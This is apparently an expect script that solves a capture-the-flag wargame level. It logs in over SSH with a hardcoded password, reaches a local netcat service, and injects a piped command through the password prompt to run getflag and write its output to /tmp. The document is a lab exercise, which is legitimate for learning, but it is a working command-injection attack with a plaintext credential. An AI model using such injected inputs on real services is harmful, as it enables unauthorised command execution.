#!/usr/bin/expect -f
set ip 192.168.1.103
spawn ssh -o "StrictHostKeyChecking no" level11@$ip -p 4242 "mkdir -p /tmp/level11 ; cd /tmp/level11 ; rm -rf ./* ; chmod 777 . ; nc 127.0.0.1 5151"
expect "sword:"
send "feulo4b72j7edeahuete3no7c\r"
expect "sword:"
send "any | echo \$\(getflag\) > /tmp/level11/flag\r"
spawn ssh -o "StrictHostKeyChecking no" level11@$ip -p 4242 "cat /tmp/level11/flag"
expect "sword:"
send "feulo4b72j7edeahuete3no7c\r"
interact
